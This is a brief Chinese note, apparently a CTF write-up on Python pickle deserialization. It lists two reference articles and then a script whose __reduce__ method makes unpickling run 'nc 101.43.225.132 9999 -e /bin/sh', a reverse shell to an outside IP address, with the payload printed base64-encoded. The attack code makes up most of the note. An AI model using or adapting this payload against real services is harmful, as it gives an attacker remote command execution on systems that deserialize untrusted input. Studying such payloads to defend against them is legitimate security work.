# 知识点
[Python pickle 反序列化详解 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/264363.html)<br />[pickle反序列化初探 - 先知社区](https://xz.aliyun.com/t/7436#toc-5)
# 思路
```plsql
import pickle
import base64

class cmd():
    def __reduce__(self):
        return (eval,("__import__('os').popen('nc 101.43.225.132 9999 -e /bin/sh').read()",))

c = cmd()
c = pickle.dumps(c)
print(base64.b64encode(c))
```
